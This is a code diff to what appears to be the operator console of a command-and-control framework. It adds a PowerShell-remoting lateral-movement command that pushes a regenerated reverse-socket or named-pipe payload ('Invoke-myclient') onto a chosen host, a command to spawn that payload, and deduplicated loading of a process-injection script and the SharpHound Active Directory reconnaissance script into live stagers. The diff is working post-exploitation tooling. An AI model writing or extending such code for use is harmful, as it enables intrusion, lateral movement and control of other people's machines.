@@ -405,7 +405,7 @@ class mymainclass():
                 if command_id == self.__t_myconstant.CMD_BACK:
                     cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
                     continue
-                
+
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSEXEC:
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
@@ -619,10 +619,15 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_running_stager():
                         print("Please input a valid stager uuid")
                         continue
+                    
+                    if ("Invoke-inject.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
 
-                    t_psloader = ps_loader()
-                    t_result = t_psloader.load_ps("Invoke-inject.ps1")
-                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-inject.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-inject.ps1")
+                    else:
+                        print("Inject already loaded")
 
                     removecomplete()
                     user_input_target = input("Please enter pid to inject into: ")
@@ -646,9 +651,9 @@ class mymainclass():
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
                         self.__t_myserver.create_command(user_input_stager,"psload",t_result)
-                        #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Sharphound3.ps1")
-
+                    else:
+                        print("Sharphound3 already loaded")
                     
                     removecomplete()
                     user_input_domain = input("Please enter the targer domain: ")
@@ -758,6 +763,69 @@ class mymainclass():
                         continue
 
                     self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname: ")
+                    #print("Moving to {}".format(user_input_path))
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                    self.__t_myserver.clean_psloadlist(user_input_stager)
+
+                    t_psloader = ps_loader() #right after reset, no need to check list
+                    t_result = t_psloader.load_ps("Invoke-myclient.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                    self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-myclient")
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SPAWN_PS:
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    if ("Invoke-myclient.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-myclient.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
+                    else:
+                        print("Payload already loaded")
+                    
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-myclient")
                     continue
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
